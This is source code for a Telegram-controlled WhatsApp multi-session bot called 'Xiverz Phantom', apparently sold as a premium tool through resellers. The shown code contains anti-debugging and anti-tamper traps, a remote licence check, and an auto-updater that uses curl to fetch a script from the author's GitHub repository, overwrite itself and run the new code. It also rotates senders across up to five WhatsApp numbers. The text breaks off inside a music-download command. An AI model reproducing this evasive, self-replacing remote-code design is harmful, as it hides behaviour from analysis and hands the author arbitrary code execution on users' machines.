const { Telegraf } = require("telegraf");
const { spawn, spawnSync } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./XvZSettings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const { EventEmitter } = require('events');

const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()
function getHash(data) {
  return crypto.createHash("md5").update(data).digest("hex");
}

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 40) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/AlipzzyStore/XvZDB/refs/heads/main/tokens.json";
const videoUrl = "https://files.catbox.moe/zs9ig0.png";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

// Fungsi untuk mengekstrak kode invite dari link
function extractInviteCode(link) {
    if (!link) return null;
    
    const patterns = [
        /chat\.whatsapp\.com\/([A-Za-z0-9_-]{22,})/,
        /whatsapp\.com\/invite\/([A-Za-z0-9_-]{22,})/,
        /wa\.me\/join\/([A-Za-z0-9_-]{22,})/
    ];
    
    for (const pattern of patterns) {
        const match = link.match(pattern);
        if (match) return match[1];
    }
    
    if (/^[A-Za-z0-9_-]{22,}$/.test(link)) {
        return link;
    }
    
    return null;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "XvZTeam";
  if (code.length !== 7) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

(function inlineAutoUpdate() {
  if (process.env.XVERZ_UPDATE_SKIP === '1' || String(process.env.UPDATE_ENABLED || 'true').toLowerCase() === 'false') return;

  const owner = "AlipzzyStore";
  const repo = "Maintenance";
  const branch = 'main';
  const repoPath = 'XvZTeam.js';
  const rawUrl = process.env.UPDATE_RAW_URL || `https://raw.githubusercontent.com/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/${encodeURIComponent(branch)}/${repoPath}`;

  if (!rawUrl) {
    console.warn('Updater belum diatur owner.');
    return;
  }

  try {
    const localFile = path.resolve(__dirname, 'XvZTeam.js');
    const current = fs.readFileSync(localFile);
    const requestUrl = `${rawUrl}${rawUrl.includes('?') ? '&' : '?'}cache_bust=${Date.now()}`;
    console.log(`[updater] Mengecek: ${rawUrl}`);
    const downloaded = spawnSync('curl', ['-fsSL', '-H', 'Cache-Control: no-cache', '--max-time', String(Number(process.env.UPDATE_TIMEOUT_SEC) || 15), requestUrl], {
      encoding: null,
      maxBuffer: 10 * 1024 * 1024
    });

    if (downloaded.status !== 0 || !downloaded.stdout?.length) {
      const detail = downloaded.stderr?.toString().trim() || `curl exit code ${downloaded.status}`;
      throw new Error(`file GitHub tidak dapat diambil: ${detail}`);
    }

    const incoming = Buffer.from(downloaded.stdout);

    if (incoming.length > 10 * 1024 * 1024) throw new Error('file update terlalu besar');

    const digest = (value) => crypto.createHash('sha256').update(value).digest('hex');
    if (digest(current) === digest(incoming)) {
      console.log(`[updater] XvZTeam.js sudah versi terbaru (${digest(current).slice(0, 12)}).`);
      return;
    }

    const backup = `${localFile}.bak.${new Date().toISOString().replace(/[:.]/g, '-')}`;
    const temporary = `${localFile}.tmp-${process.pid}`;

    fs.copyFileSync(localFile, backup);
    fs.writeFileSync(temporary, incoming, { mode: 0o600 });
    fs.renameSync(temporary, localFile);

    console.log(`[updater] Update berhasil. Menjalankan versi terbaru...`);
    const child = spawnSync(process.execPath, [localFile], {
      cwd: __dirname,
      env: { ...process.env, XVERZ_UPDATE_SKIP: '1' },
      stdio: 'inherit'
    });
    process.exit(child.status ?? 1);
  } catch (error) {
    console.error(`[updater] Update gagal: ${error.message}`);
    process.exit(1);
  }
})();

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

/*(async () => {
    await validateToken(databaseUrl, tokenBot);
})();*/

const bot = new Telegraf(tokenBot);
let tokenValidated = false; 
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let senderConnectionStatus = 'disconnected';
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const MAX_SESSIONS = Math.max(2, Number(process.env.MAX_SESSIONS) || 5);
const sessionStates = new Map();
let activeSessionIndex = null;
let previousActiveSessionIndex = null;
let sessionRotationInProgress = false;

const sessionRoot = path.join(__dirname, 'src');
fs.mkdirSync(sessionRoot, { recursive: true });

const getSessionName = (index) => index === 1 ? 'session' : `session${index}`;
const getSessionPath = (index) => path.join(sessionRoot, getSessionName(index));
const getLegacySessionPath = (index) => path.join(__dirname, getSessionName(index));

function migrateLegacySession(index) {
    const legacyPath = getLegacySessionPath(index);
    const newPath = getSessionPath(index);
    if (!fs.existsSync(legacyPath)) return;

    try {
        const legacyCreds = path.join(legacyPath, 'creds.json');
        const newCreds = path.join(newPath, 'creds.json');

        if (fs.existsSync(newCreds)) {
            fs.rmSync(legacyPath, { recursive: true, force: true });
            return;
        }

        if (fs.existsSync(newPath)) {
            fs.rmSync(newPath, { recursive: true, force: true });
        }

        fs.renameSync(legacyPath, newPath);
        console.log(chalk.yellow(`${getSessionLabel(index)} dipindahkan ke ${newPath}.`));
    } catch (error) {
        console.error(`Gagal memindahkan ${getSessionLabel(index)} ke src:`, error.message);
    }
}

const hasSessionCredentials = (index) => {
    migrateLegacySession(index);
    return fs.existsSync(path.join(getSessionPath(index), 'creds.json'));
}
const getSessionLabel = (index) => `session ${index}`;
const getSessionNumber = (sessionState) => sessionState?.authState?.creds?.me?.id?.split(':')[0]?.split('@')[0] || 'belum diketahui';
const deleteSessionStorage = (index) => {
    try {
        fs.rmSync(getSessionPath(index), { recursive: true, force: true });
        fs.rmSync(getLegacySessionPath(index), { recursive: true, force: true });
        console.log(chalk.yellow(`${getSessionLabel(index)} dihapus karena koneksi mati.`));
    } catch (error) {
        console.error(`Gagal menghapus ${getSessionLabel(index)}:`, error.message);
    }
};

async function notifySessionSwitch(previousIndex, nextSession, reason) {
    if (previousIndex === null || previousIndex === nextSession.index) return;

    const message = [
        '🔄 PERGANTIAN SENDER AKTIF',
        '',
        `Session lama: ${getSessionLabel(previousIndex)}`,
        `Session baru: ${getSessionLabel(nextSession.index)}`,
        `Nomor sender: ${getSessionNumber(nextSession)}`,
        `Alasan: ${reason || 'rotasi otomatis'}`,
        'Status: Sender baru aktif'
    ].join('\n');

    try {
        await bot.telegram.sendMessage(ownerID, message);
    } catch (error) {
        console.error('Gagal mengirim notifikasi pergantian session:', error.message);
    }
}

function setActiveSession(sessionState, reason = 'startup') {
    if (!sessionState || sessionState.status !== 'open') return false;

    const previousIndex = activeSessionIndex ?? previousActiveSessionIndex;
    activeSessionIndex = sessionState.index;
    previousActiveSessionIndex = null;
    sock = sessionState.sock;
    isWhatsAppConnected = true;
    senderConnectionStatus = 'connected';
    linkedWhatsAppNumber = sessionState.authState?.creds?.me?.id || '';
    void updateKnownPanels();

    if (previousIndex !== sessionState.index) {
        console.log(chalk.green(`Sender aktif: ${getSessionLabel(sessionState.index)}${reason ? ` (${reason})` : ''}`));
        void notifySessionSwitch(previousIndex, sessionState, reason);
    }

    return true;
}

function clearActiveSession(sessionState) {
    if (!sessionState || activeSessionIndex !== sessionState.index) return;

    previousActiveSessionIndex = activeSessionIndex;
    activeSessionIndex = null;
    sock = null;
    isWhatsAppConnected = false;
    senderConnectionStatus = 'reconnecting';
    linkedWhatsAppNumber = '';
    void updateKnownPanels();
}

function syncActiveSenderState() {
    const activeState = activeSessionIndex ? sessionStates.get(activeSessionIndex) : null;
    if (!activeState || activeState.status !== 'open' || !activeState.sock) {
        return false;
    }

    sock = activeState.sock;
    isWhatsAppConnected = true;
    linkedWhatsAppNumber = activeState.authState?.creds?.me?.id || '';
    return true;
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSession = async (index) => {
    const existing = sessionStates.get(index);
    if (existing && ['starting', 'connecting', 'open'].includes(existing.status)) {
        return existing;
    }

    migrateLegacySession(index);
    const sessionPath = getSessionPath(index);
    const sessionState = {
        index,
        path: sessionPath,
        authState: null,
        sock: null,
        status: 'starting',
        pairingRequested: false,
        pendingPhoneNumber: null,
        promoteOnOpen: false,
        reconnectTimer: null,
        logoutHandled: false
    };
    sessionStates.set(index, sessionState);

    const { state: authState, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();
    sessionState.authState = authState;
    sessionState.status = 'connecting';

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: authState,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        markOnlineOnConnect: false,
        syncFullHistory: false,
        getMessage: async () => ({ conversation: 'XvZTeam' })
    };

    const sessionSock = makeWASocket(connectionOptions);
    sessionState.sock = sessionSock;

    sessionSock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m?.messages?.[0]) return;
            const msg = m.messages[0];
            const chatId = msg.key.remoteJid || "Tidak Diketahui";
        } catch (error) {
            console.error(`${getSessionLabel(index)} message error:`, error.message);
        }
    });

    sessionSock.ev.on('creds.update', saveCreds);
    sessionSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            sessionState.status = 'open';
            sessionState.pairingRequested = false;
            sessionState.pendingPhoneNumber = null;

            if (activeSessionIndex === null && (!sessionState.wasCreatedForPairing || sessionState.promoteOnOpen)) {
                sessionState.promoteOnOpen = false;
                setActiveSession(sessionState, sessionState.wasCreatedForPairing ? 'rotasi otomatis' : 'fallback');
            }

            if (activeSessionIndex === index) {
                senderConnectionStatus = 'connected';
            }
            void updateKnownPanels();

            if (lastPairingMessage?.sessionIndex === index) {
                const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender XiverzPhantom</blockquote>
⌑ Session: ${getSessionLabel(index)}
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

                try {
                    await bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu,
                        { parse_mode: "HTML" }
                    );
                } catch (error) {
                    console.error('Gagal memperbarui pesan pairing:', error.message);
                }
                lastPairingMessage = null;
            }

            console.log(chalk.green(`☇ ${getSessionLabel(index)} terhubung${activeSessionIndex === index ? ' dan menjadi sender aktif' : ' sebagai standby'}.`));
            return;
        }

        if (connection === 'close') {
            sessionState.status = 'closed';
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const disconnectError = lastDisconnect?.error;
            const disconnectMessage = disconnectError?.message || disconnectError?.output?.payload?.message || 'alasan tidak diketahui';
            const wasActive = activeSessionIndex === index;
            const pairingWasInProgress = sessionState.pairingRequested && !sessionState.authState?.creds?.registered;
            clearActiveSession(sessionState);

            console.error(`${getSessionLabel(index)} terputus. Status: ${statusCode || 'unknown'}; Error: ${disconnectMessage}`);
            
            if (statusCode === 515) {
                if (lastPairingMessage?.sessionIndex === index) {
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            `<blockquote>( 🦋 ) - Connect Sender</blockquote>\n⌑ Session: ${getSessionLabel(index)}\n⌑ Status: Socket sedang restart\n⌑ Keterangan: WhatsApp meminta koneksi diulang, pairing sedang dilanjutkan.`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (error) {
                        console.error('Gagal memperbarui status restart pairing:', error.message);
                    }
                }

                setTimeout(async () => {
                    try {
                        sessionStates.delete(index);
                        const restartedSession = await startSession(index);
                        if (restartedSession?.authState?.creds?.registered) {
                            console.log(chalk.green(`${getSessionLabel(index)} berhasil melanjutkan pairing setelah restart 515.`));
                        } else {
                            console.log(chalk.yellow(`${getSessionLabel(index)} sudah restart. Jika belum terhubung, kirim /pair 62xxx lagi.`));
                        }
                    } catch (error) {
                        console.error(`Gagal restart ${getSessionLabel(index)} setelah status 515:`, error.message);
                    }
                }, 1500);
                return;
            }

            if (pairingWasInProgress) {
                if (lastPairingMessage?.sessionIndex === index) {
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            `<blockquote>( 🦋 ) - Connect Sender</blockquote>\n⌑ Session: ${getSessionLabel(index)}\n⌑ Status: Pairing terputus\n⌑ Error: ${disconnectMessage}\n\nKirim ulang perintah /connect 62xxx untuk membuat kode baru.`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (error) {
                        console.error('Gagal memperbarui status pairing:', error.message);
                    }
                    lastPairingMessage = null;
                }

                setTimeout(async () => {
                    try {
                        sessionStates.delete(index);
                        await startSession(index);
                        console.log(chalk.yellow(`${getSessionLabel(index)} siap dicoba pairing ulang dari Telegram.`));
                    } catch (error) {
                        console.error(`Gagal menyiapkan ulang ${getSessionLabel(index)}:`, error.message);
                    }
                }, 2000);
                return;
            }

            console.log(chalk.red(`☇ ${getSessionLabel(index)} terputus.`));

            if (wasActive) {
                if (sessionState.logoutHandled) return;
                sessionState.logoutHandled = true;
                sessionStates.delete(index);
                deleteSessionStorage(index);
                await activateNextSession(index);
            }
        }
    });

    return sessionState;
};

const activateNextSession = async (closedIndex = 0) => {
    if (sessionRotationInProgress) return;
    sessionRotationInProgress = true;

    try {
        for (let index = closedIndex + 1; index <= MAX_SESSIONS; index++) {
            const existing = sessionStates.get(index);
            if (existing?.status === 'open') {
                setActiveSession(existing, 'rotasi otomatis');
                return existing;
            }

            if (existing?.status === 'connecting') {
                existing.promoteOnOpen = true;
                return existing;
            }

            if (!hasSessionCredentials(index)) continue;

            const next = await startSession(index);
            next.promoteOnOpen = true;
            return next;
        }

        console.log(chalk.yellow(`Tidak ada session standby setelah ${getSessionLabel(closedIndex)}.`));
        isWhatsAppConnected = false;
        senderConnectionStatus = 'disconnected';
        sock = null;
        void updateKnownPanels();
        return null;
    } finally {
        sessionRotationInProgress = false;
    }
};

const findPairingSession = async () => {
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        const existing = sessionStates.get(index);

        if (existing?.status === 'starting') {
            for (let attempt = 0; attempt < 50 && !existing.sock; attempt++) {
                await sleep(100);
            }
            if (existing.sock) return existing;
        }

        if (existing?.status === 'closed') {
            sessionStates.delete(index);
        } else if (existing?.authState && !existing.authState.creds.registered) {
            return existing;
        }

        if (!hasSessionCredentials(index)) {
            return startSession(index);
        }
    }

    return null;
};

const startSesi = async () => {
    console.clear();
    console.log(chalk.yellow(`Multi-session aktif: ${getSessionLabel(1)} sampai ${getSessionLabel(MAX_SESSIONS)}`));

    let firstSession = null;
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        if (hasSessionCredentials(index)) {
            firstSession = await startSession(index);
            break;
        }
    }

    if (!firstSession) {
        firstSession = await startSession(1);
    }

    if (firstSession.status === 'open') {
        setActiveSession(firstSession, 'startup');
    }
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    syncActiveSenderState();

    if (!isWhatsAppConnected || !sock) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command(["connect", "pair"], async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.trim().split(/\s+/).slice(1);
    const rawNumber = args[0];
    if (!rawNumber) {
        return ctx.reply("🪧 ☇ Format: /connect 62xxx");
    }

    let phoneNumber = rawNumber.replace(/[^0-9]/g, "");
    if (phoneNumber.startsWith("0")) {
        phoneNumber = `62${phoneNumber.slice(1)}`;
    }

    if (!/^62\d{8,13}$/.test(phoneNumber)) {
        return ctx.reply("❌ ☇ Nomor tidak valid. Gunakan format internasional, contoh: /connect 628xxxxxxxxx");
    }

    try {
        const pairingSession = await findPairingSession();
        if (!pairingSession?.sock) {
            return ctx.reply(`❌ ☇ Semua slot session (${MAX_SESSIONS}) sudah terpakai atau belum siap`);
        }

        if (pairingSession.authState?.creds?.registered) {
            return ctx.reply(`✅ ☇ ${getSessionLabel(pairingSession.index)} sudah terhubung dengan nomor lain`);
        }

        pairingSession.pairingRequested = true;
        pairingSession.pendingPhoneNumber = phoneNumber;
        pairingSession.wasCreatedForPairing = true;

        await sleep(3000);
        if (pairingSession.status === 'closed' || !pairingSession.sock) {
            pairingSession.pairingRequested = false;
            return ctx.reply(`❌ ☇ ${getSessionLabel(pairingSession.index)} terputus sebelum kode dibuat. Silakan kirim /pair ${phoneNumber} lagi.`);
        }

        const code = await pairingSession.sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        if (!formattedCode) {
            return ctx.reply("❌ ☇ Kode pairing tidak berhasil dibuat, silakan coba lagi");
        }

        const pairingMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Session: ${getSessionLabel(pairingSession.index)}
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected

Buka WhatsApp → Perangkat tertaut → Tautkan perangkat → Tautkan dengan nomor telepon, lalu masukkan kode di atas.`;

        const sentMsg = await ctx.replyWithPhoto(videoUrl, {
            caption: pairingMenu,
            parse_mode: "HTML"
        });

        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode,
            sessionIndex: pairingSession.index
        };
    } catch (err) {
        console.error("Gagal membuat kode pairing:", err);
        const pairingSession = sessionStates.get(activeSessionIndex) || [...sessionStates.values()].find((state) => state.pairingRequested);
        if (pairingSession) pairingSession.pairingRequested = false;
        await ctx.reply(`❌ ☇ Gagal membuat kode pairing: ${err.message || 'error tidak diketahui'}`);
    }
});

bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `<blockqoute>JavaScript
🎧 SPOTIFY MUSIC - XiverzPhantom

🎵 Title      : ${result.title}
🎤 Artist     : ${result.author || "Unknown"}
⏱ Duration   : ${formatDuration(result.duration)}
📅 Release    : ${result.uploadDate || "Unknown"}
🔗 Source     : ${result.source}

────────────────────
🚀 Powered By XvZ Team
</blockqoute>`;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
